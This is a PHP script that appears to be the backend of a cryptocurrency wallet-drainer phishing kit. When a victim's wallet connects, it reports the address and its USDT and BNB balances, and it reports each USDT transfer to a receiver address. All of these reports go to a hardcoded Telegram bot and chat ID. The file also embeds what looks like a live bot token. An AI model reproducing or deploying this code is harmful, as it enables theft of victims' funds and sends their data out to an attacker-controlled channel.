<?php
$botToken = '7536567492:AAHTGbJZXi2g7N_qY-AnpTBMZ6jHFYM42eM';
$chatId = '8191508290';

$data = json_decode(file_get_contents("php://input"), true);

if (!$data || !isset($data['type'])) {
    echo json_encode(['status' => 'invalid request']);
    exit;
}

$type = $data['type'];

if ($type === 'connect') {
    $wallet = htmlspecialchars($data['wallet']);
    $usdt = htmlspecialchars($data['usdt']);
    $bnb = htmlspecialchars($data['bnb']);

    $message = "🟢 *New Wallet Connected*\n\n" .
               "👛 Wallet: `$wallet`\n" .
               "💵 USDT: *$usdt*\n" .
               "🪙 BNB: *$bnb*\n" .
               "⏰ Time: " . date("Y-m-d H:i:s");

} elseif ($type === 'transaction') {
    $wallet = htmlspecialchars($data['wallet']);
    $usdt = htmlspecialchars($data['usdt']);
    $receiver = htmlspecialchars($data['receiver']);

    $message = "✅ *USDT Transferred*\n\n" .
               "👛 From: `$wallet`\n" .
               "💵 USDT: *$usdt*\n" .
               "📥 To: `$receiver`\n" .
               "🕒 Time: " . date("Y-m-d H:i:s");

} else {
    echo json_encode(['status' => 'unknown type']);
    exit;
}

// Send Telegram message
$url = "https://api.telegram.org/bot$botToken/sendMessage";
$params = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => $url,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $params,
]);
curl_exec($ch);
curl_close($ch);

echo json_encode(['status' => 'sent']);
?>
